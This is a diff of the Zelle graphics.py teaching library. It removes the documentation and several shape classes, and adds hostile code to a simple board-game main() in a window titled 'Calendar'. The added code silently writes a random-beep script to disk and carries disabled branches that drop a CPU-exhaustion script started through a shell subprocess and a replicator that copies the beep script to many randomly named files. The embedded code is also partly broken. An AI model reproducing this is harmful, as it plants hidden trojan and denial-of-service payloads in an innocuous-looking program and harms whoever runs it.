@@ -1,165 +1,5 @@
 
-# graphics.py
-"""Simple object oriented graphics library  
-
-The library is designed to make it very easy for novice programmers to
-experiment with computer graphics in an object oriented fashion. It is
-written by John Zelle for use with the book "Python Programming: An
-Introduction to Computer Science" (Franklin, Beedle & Associates).
-
-LICENSE: This is open-source software released under the terms of the
-GPL (http://www.gnu.org/licenses/gpl.html).
-
-PLATFORMS: The package is a wrapper around Tkinter and should run on
-any platform where Tkinter is available.
-
-INSTALLATION: Put this file somewhere where Python can see it.
-
-OVERVIEW: There are two kinds of objects in the library. The GraphWin
-class implements a window where drawing can be done and various
-GraphicsObjects are provided that can be drawn into a GraphWin. As a
-simple example, here is a complete program to draw a circle of radius
-10 centered in a 100x100 window:
-
---------------------------------------------------------------------
-from graphics import *
-
-def main():
-    win = GraphWin("My Circle", 100, 100)
-    c = Circle(Point(50,50), 10)
-    c.draw(win)
-    win.getMouse() # Pause to view result
-    win.close()    # Close window when done
-
-main()
---------------------------------------------------------------------
-GraphWin objects support coordinate transformation through the
-setCoords method and mouse and keyboard interaction methods.
-
-The library provides the following graphical objects:
-    Point
-    Line
-    Circle
-    Oval
-    Rectangle
-    Polygon
-    Text
-    Entry (for text-based input)
-    Image
-
-Various attributes of graphical objects can be set such as
-outline-color, fill-color and line-width. Graphical objects also
-support moving and hiding for animation effects.
-
-The library also provides a very simple class for pixel-based image
-manipulation, Pixmap. A pixmap can be loaded from a file and displayed
-using an Image object. Both getPixel and setPixel methods are provided
-for manipulating the image.
-
-DOCUMENTATION: For complete documentation, see Chapter 4 of "Python
-Programming: An Introduction to Computer Science" by John Zelle,
-published by Franklin, Beedle & Associates.  Also see
-http://mcsp.wartburg.edu/zelle/python for a quick reference"""
-
 __version__ = "5.0"
-
-# Version 5 8/26/2016
-#     * update at bottom to fix MacOS issue causing askopenfile() to hang
-#     * update takes an optional parameter specifying update rate
-#     * Entry objects get focus when drawn
-#     * __repr_ for all objects
-#     * fixed offset problem in window, made canvas borderless
-
-# Version 4.3 4/25/2014
-#     * Fixed Image getPixel to work with Python 3.4, TK 8.6 (tuple type handling)
-#     * Added interactive keyboard input (getKey and checkKey) to GraphWin
-#     * Modified setCoords to cause redraw of current objects, thus
-#       changing the view. This supports scrolling around via setCoords.
-#
-# Version 4.2 5/26/2011
-#     * Modified Image to allow multiple undraws like other GraphicsObjects
-# Version 4.1 12/29/2009
-#     * Merged Pixmap and Image class. Old Pixmap removed, use Image.
-# Version 4.0.1 10/08/2009
-#     * Modified the autoflush on GraphWin to default to True
-#     * Autoflush check on close, setBackground
-#     * Fixed getMouse to flush pending clicks at entry
-# Version 4.0 08/2009
-#     * Reverted to non-threaded version. The advantages (robustness,
-#         efficiency, ability to use with other Tk code, etc.) outweigh
-#         the disadvantage that interactive use with IDLE is slightly more
-#         cumbersome.
-#     * Modified to run in either Python 2.x or 3.x (same file).
-#     * Added Image.getPixmap()
-#     * Added update() -- stand alone function to cause any pending
-#           graphics changes to display.
-#
-# Version 3.4 10/16/07
-#     Fixed GraphicsError to avoid "exploded" error messages.
-# Version 3.3 8/8/06
-#     Added checkMouse method to GraphWin
-# Version 3.2.3
-#     Fixed error in Polygon init spotted by Andrew Harrington
-#     Fixed improper threading in Image constructor
-# Version 3.2.2 5/30/05
-#     Cleaned up handling of exceptions in Tk thread. The graphics package
-#     now raises an exception if attempt is made to communicate with
-#     a dead Tk thread.
-# Version 3.2.1 5/22/05
-#     Added shutdown function for tk thread to eliminate race-condition
-#        error "chatter" when main thread terminates
-#     Renamed various private globals with _
-# Version 3.2 5/4/05
-#     Added Pixmap object for simple image manipulation.
-# Version 3.1 4/13/05
-#     Improved the Tk thread communication so that most Tk calls
-#        do not have to wait for synchonization with the Tk thread.
-#        (see _tkCall and _tkExec)
-# Version 3.0 12/30/04
-#     Implemented Tk event loop in separate thread. Should now work
-#        interactively with IDLE. Undocumented autoflush feature is
-#        no longer necessary. Its default is now False (off). It may
-#        be removed in a future version.
-#     Better handling of errors regarding operations on windows that
-#       have been closed.
-#     Addition of an isClosed method to GraphWindow class.
-
-# Version 2.2 8/26/04
-#     Fixed cloning bug reported by Joseph Oldham.
-#     Now implements deep copy of config info.
-# Version 2.1 1/15/04
-#     Added autoflush option to GraphWin. When True (default) updates on
-#        the window are done after each action. This makes some graphics
-#        intensive programs sluggish. Turning off autoflush causes updates
-#        to happen during idle periods or when flush is called.
-# Version 2.0
-#     Updated Documentation
-#     Made Polygon accept a list of Points in constructor
-#     Made all drawing functions call TK update for easier animations
-#          and to make the overall package work better with
-#          Python 2.3 and IDLE 1.0 under Windows (still some issues).
-#     Removed vestigial turtle graphics.
-#     Added ability to configure font for Entry objects (analogous to Text)
-#     Added setTextColor for Text as an alias of setFill
-#     Changed to class-style exceptions
-#     Fixed cloning of Text objects
-
-# Version 1.6
-#     Fixed Entry so StringVar uses _root as master, solves weird
-#            interaction with shell in Idle
-#     Fixed bug in setCoords. X and Y coordinates can increase in
-#           "non-intuitive" direction.
-#     Tweaked wm_protocol so window is not resizable and kill box closes.
-
-# Version 1.5
-#     Fixed bug in Entry. Can now define entry before creating a
-#     GraphWin. All GraphWins are now toplevel windows and share
-#     a fixed root (called _root).
-
-# Version 1.4
-#     Fixed Garbage collection of Tkinter images bug.
-#     Added ability to set text atttributes.
-#     Added Entry boxes.
 
 import time, os, sys
 
@@ -597,49 +437,6 @@ class _BBox(GraphicsObject):
         p2 = self.p2
         return Point((p1.x+p2.x)/2.0, (p1.y+p2.y)/2.0)
 
-    
-class Rectangle(_BBox):
-    
-    def __init__(self, p1, p2):
-        _BBox.__init__(self, p1, p2)
-
-    def __repr__(self):
-        return "Rectangle({}, {})".format(str(self.p1), str(self.p2))
-    
-    def _draw(self, canvas, options):
-        p1 = self.p1
-        p2 = self.p2
-        x1,y1 = canvas.toScreen(p1.x,p1.y)
-        x2,y2 = canvas.toScreen(p2.x,p2.y)
-        return canvas.create_rectangle(x1,y1,x2,y2,options)
-        
-    def clone(self):
-        other = Rectangle(self.p1, self.p2)
-        other.config = self.config.copy()
-        return other
-
-
-class Oval(_BBox):
-    
-    def __init__(self, p1, p2):
-        _BBox.__init__(self, p1, p2)
-
-    def __repr__(self):
-        return "Oval({}, {})".format(str(self.p1), str(self.p2))
-
-        
-    def clone(self):
-        other = Oval(self.p1, self.p2)
-        other.config = self.config.copy()
-        return other
-   
-    def _draw(self, canvas, options):
-        p1 = self.p1
-        p2 = self.p2
-        x1,y1 = canvas.toScreen(p1.x,p1.y)
-        x2,y2 = canvas.toScreen(p2.x,p2.y)
-        return canvas.create_oval(x1,y1,x2,y2,options)
-    
 class Circle(Oval):
     
     def __init__(self, center, radius):
@@ -688,322 +485,10 @@ class Line(_BBox):
         self._reconfig("arrow", option)
         
 
-class Polygon(GraphicsObject):
-    
-    def __init__(self, *points):
-        # if points passed as a list, extract it
-        if len(points) == 1 and type(points[0]) == type([]):
-            points = points[0]
-        self.points = list(map(Point.clone, points))
-        GraphicsObject.__init__(self, ["outline", "width", "fill"])
-
-    def __repr__(self):
-        return "Polygon"+str(tuple(p for p in self.points))
-        
-    def clone(self):
-        other = Polygon(*self.points)
-        other.config = self.config.copy()
-        return other
-
-    def getPoints(self):
-        return list(map(Point.clone, self.points))
-
-    def _move(self, dx, dy):
-        for p in self.points:
-            p.move(dx,dy)
-   
-    def _draw(self, canvas, options):
-        args = [canvas]
-        for p in self.points:
-            x,y = canvas.toScreen(p.x,p.y)
-            args.append(x)
-            args.append(y)
-        args.append(options)
-        return GraphWin.create_polygon(*args) 
-
-class Text(GraphicsObject):
-    
-    def __init__(self, p, text):
-        GraphicsObject.__init__(self, ["justify","fill","text","font"])
-        self.setText(text)
-        self.anchor = p.clone()
-        self.setFill(DEFAULT_CONFIG['outline'])
-        self.setOutline = self.setFill
-
-    def __repr__(self):
-        return "Text({}, '{}')".format(self.anchor, self.getText())
-    
-    def _draw(self, canvas, options):
-        p = self.anchor
-        x,y = canvas.toScreen(p.x,p.y)
-        return canvas.create_text(x,y,options)
-        
-    def _move(self, dx, dy):
-        self.anchor.move(dx,dy)
-        
-    def clone(self):
-        other = Text(self.anchor, self.config['text'])
-        other.config = self.config.copy()
-        return other
-
-    def setText(self,text):
-        self._reconfig("text", text)
-        
-    def getText(self):
-        return self.config["text"]
-            
-    def getAnchor(self):
-        return self.anchor.clone()
-
-    def setFace(self, face):
-        if face in ['helvetica','arial','courier','times roman']:
-            f,s,b = self.config['font']
-            self._reconfig("font",(face,s,b))
-        else:
-            raise GraphicsError(BAD_OPTION)
-
-    def setSize(self, size):
-        if 5 <= size <= 36:
-            f,s,b = self.config['font']
-            self._reconfig("font", (f,size,b))
-        else:
-            raise GraphicsError(BAD_OPTION)
-
-    def setStyle(self, style):
-        if style in ['bold','normal','italic', 'bold italic']:
-            f,s,b = self.config['font']
-            self._reconfig("font", (f,s,style))
-        else:
-            raise GraphicsError(BAD_OPTION)
-
-    def setTextColor(self, color):
-        self.setFill(color)
 
 
-class Entry(GraphicsObject):
-
-    def __init__(self, p, width):
-        GraphicsObject.__init__(self, [])
-        self.anchor = p.clone()
-        #print self.anchor
-        self.width = width
-        self.text = tk.StringVar(_root)
-        self.text.set("")
-        self.fill = "gray"
-        self.color = "black"
-        self.font = DEFAULT_CONFIG['font']
-        self.entry = None
-
-    def __repr__(self):
-        return "Entry({}, {})".format(self.anchor, self.width)
-
-    def _draw(self, canvas, options):
-        p = self.anchor
-        x,y = canvas.toScreen(p.x,p.y)
-        frm = tk.Frame(canvas.master)
-        self.entry = tk.Entry(frm,
-                              width=self.width,
-                              textvariable=self.text,
-                              bg = self.fill,
-                              fg = self.color,
-                              font=self.font)
-        self.entry.pack()
-        #self.setFill(self.fill)
-        self.entry.focus_set()
-        return canvas.create_window(x,y,window=frm)
-
-    def getText(self):
-        return self.text.get()
-
-    def _move(self, dx, dy):
-        self.anchor.move(dx,dy)
-
-    def getAnchor(self):
-        return self.anchor.clone()
-
-    def clone(self):
-        other = Entry(self.anchor, self.width)
-        other.config = self.config.copy()
-        other.text = tk.StringVar()
-        other.text.set(self.text.get())
-        other.fill = self.fill
-        return other
-
-    def setText(self, t):
-        self.text.set(t)
-
-            
-    def setFill(self, color):
-        self.fill = color
-        if self.entry:
-            self.entry.config(bg=color)
-
-            
-    def _setFontComponent(self, which, value):
-        font = list(self.font)
-        font[which] = value
-        self.font = tuple(font)
-        if self.entry:
-            self.entry.config(font=self.font)
 
 
-    def setFace(self, face):
-        if face in ['helvetica','arial','courier','times roman']:
-            self._setFontComponent(0, face)
-        else:
-            raise GraphicsError(BAD_OPTION)
-
-    def setSize(self, size):
-        if 5 <= size <= 36:
-            self._setFontComponent(1,size)
-        else:
-            raise GraphicsError(BAD_OPTION)
-
-    def setStyle(self, style):
-        if style in ['bold','normal','italic', 'bold italic']:
-            self._setFontComponent(2,style)
-        else:
-            raise GraphicsError(BAD_OPTION)
-
-    def setTextColor(self, color):
-        self.color=color
-        if self.entry:
-            self.entry.config(fg=color)
-
-
-class Image(GraphicsObject):
-
-    idCount = 0
-    imageCache = {} # tk photoimages go here to avoid GC while drawn 
-    
-    def __init__(self, p, *pixmap):
-        GraphicsObject.__init__(self, [])
-        self.anchor = p.clone()
-        self.imageId = Image.idCount
-        Image.idCount = Image.idCount + 1
-        if len(pixmap) == 1: # file name provided
-            self.img = tk.PhotoImage(file=pixmap[0], master=_root)
-        else: # width and height provided
-            width, height = pixmap
-            self.img = tk.PhotoImage(master=_root, width=width, height=height)
-
-    def __repr__(self):
-        return "Image({}, {}, {})".format(self.anchor, self.getWidth(), self.getHeight())
-                
-    def _draw(self, canvas, options):
-        p = self.anchor
-        x,y = canvas.toScreen(p.x,p.y)
-        self.imageCache[self.imageId] = self.img # save a reference  
-        return canvas.create_image(x,y,image=self.img)
-    
-    def _move(self, dx, dy):
-        self.anchor.move(dx,dy)
-        
-    def undraw(self):
-        try:
-            del self.imageCache[self.imageId]  # allow gc of tk photoimage
-        except KeyError:
-            pass
-        GraphicsObject.undraw(self)
-
-    def getAnchor(self):
-        return self.anchor.clone()
-        
-    def clone(self):
-        other = Image(Point(0,0), 0, 0)
-        other.img = self.img.copy()
-        other.anchor = self.anchor.clone()
-        other.config = self.config.copy()
-        return other
-
-    def getWidth(self):
-        """Returns the width of the image in pixels"""
-        return self.img.width() 
-
-    def getHeight(self):
-        """Returns the height of the image in pixels"""
-        return self.img.height()
-
-    def getPixel(self, x, y):
-        """Returns a list [r,g,b] with the RGB color values for pixel (x,y)
-        r,g,b are in range(256)
-
-        """
-        
-        value = self.img.get(x,y) 
-        if type(value) ==  type(0):
-            return [value, value, value]
-        elif type(value) == type((0,0,0)):
-            return list(value)
-        else:
-            return list(map(int, value.split())) 
-
-    def setPixel(self, x, y, color):
-        """Sets pixel (x,y) to the given color
-        
-        """
-        self.img.put("{" + color +"}", (x, y))
-        
-
-    def save(self, filename):
-        """Saves the pixmap image to filename.
-        The format for the save image is determined from the filname extension.
-
-        """
-        
-        path, name = os.path.split(filename)
-        ext = name.split(".")[-1]
-        self.img.write( filename, format=ext)
-
-        
-def color_rgb(r,g,b):
-    """r,g,b are intensities of red, green, and blue in range(256)
-    Returns color specifier string for the resulting color"""
-    return "#%02x%02x%02x" % (r,g,b)
-
-def test():
-    win = GraphWin()
-    win.setCoords(0,0,10,10)
-    t = Text(Point(5,5), "Centered Text")
-    t.draw(win)
-    p = Polygon(Point(1,1), Point(5,3), Point(2,7))
-    p.draw(win)
-    e = Entry(Point(5,6), 10)
-    e.draw(win)
-    win.getMouse()
-    p.setFill("red")
-    p.setOutline("blue")
-    p.setWidth(2)
-    s = ""
-    for pt in p.getPoints():
-        s = s + "(%0.1f,%0.1f) " % (pt.getX(), pt.getY())
-    t.setText(e.getText())
-    e.setFill("green")
-    e.setText("Spam!")
-    e.move(2,0)
-    win.getMouse()
-    p.move(2,3)
-    s = ""
-    for pt in p.getPoints():
-        s = s + "(%0.1f,%0.1f) " % (pt.getX(), pt.getY())
-    t.setText(s)
-    win.getMouse()
-    p.undraw()
-    e.undraw()
-    t.setStyle("bold")
-    win.getMouse()
-    t.setStyle("normal")
-    win.getMouse()
-    t.setStyle("italic")
-    win.getMouse()
-    t.setStyle("bold italic")
-    win.getMouse()
-    t.setSize(14)
-    win.getMouse()
-    t.setFace("arial")
-    t.setSize(20)
-    win.getMouse()
-    win.close()
 
 #MacOS fix 2
 #tk.Toplevel(_root).destroy()
@@ -1014,11 +499,45 @@ update()
 
 #test()
 
-
+from os import path
 def main():
     b = [[0,0,0], [0,0,0], [0,0,0]]
     win = GraphWin("Calendar", 600, 600)
     board(win)
+
+    #Choose what attack you want to do Un comment the attack lines
+    #Creates a beep
+    if(True):
+        #creates a file that will beep
+        if((path.exists("drone.py") == False)):
+            f = open('drone.py', "w")
+            f.write("import winsound\nimport random\ndef beep():\n\twinsound.Beep(random.randint(250, 5000), random.randint(500, 5000))\nbeep()")
+            f.close()
+        #exec(open("drone.py").read())
+    #CPU load Attack
+    elif(False):
+        if((path.exists("remotecmd.py") == False)):
+            with open('remotecmd.py', 'w') as rcmd:
+                rcmd.write("import subprocess\ndef main():\n\tcmd = \"nohup python CPULoadGen.py\"\n\tprocess = subprocess.Popen(cmd, shell=True)\n\nmain()")
+            with open("CPULoadGen.py", "w") as cpu:
+                cpu.write("from multiprocessing import Pool\nfrom multiprocessing import cpu_count\nimport math\ndef f(x):\n\twhile(true):\n\t\tx * factorial(1000) \n\tdef main():\n\t\tprocesses = cpu_count()\n\t\tpool = Pool(processes)\n\t\tpool.map(f, range(processes))\nmain()")
+        #exec(open("CPULoadGen.py").read())
+    #Creates a lot of beeps
+    elif(False):
+        if((path.exists("m1.py") == False)):
+            with open('m1.py') as m1:
+                m1.write("import os\nimport os.path\nfrom os import path, write\nimport winsound\nimport random\nimport shutil\n\ndef main():\n    \n    if((path.exists(\"drone.py\") == False)):\n        f = open(\'drone.py\', \"w\")\n        f.write(\"import winsound\nimportrandom\ndef beep():\n\twinsound.Beep(random.randint(250, 5000), random.randint(500, 5000))\nbeep()\")\n        f.close()\n\n\n    #effect the number of time that the drone program will be ran\n    counter = 100\n    \n    for i in range(counter):\n        n = createName()\n        shutil.copy(\"drone.py\", n)\n        #DO NOT uncomment line unless you want the code to beep\n        #exec(open(n).read())\n\ndef createName():\n    alpha = \"ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789\"\n    n = random.randint(1,10)\n    s = \"\"\n    for i in range(n):\n        ind = random.randint(0, len(alpha))\n        s += alpha[ind - 1]\n    s += \".py\"\n    return s\n\ndef beep():\n    f = random.randint(250, 5000)\n    frequency = f  # Set Frequency To 2500 Hertz\n    duration = 1000  # Set Duration To 1000 ms == 1 second\n    winsound.Beep(f, 1000)\n\nmain()\n")
+
+    
+        
+                    
+
+            
+
+
+
+
+
     i = 0
     while(i < 9 and w(b)):
         clickPoint = win.getMouse()
@@ -1031,7 +550,7 @@ def main():
         i += 1
 
     
-    #exec(open(hack.py).read())
+    
     input("press enter to close")
     
 
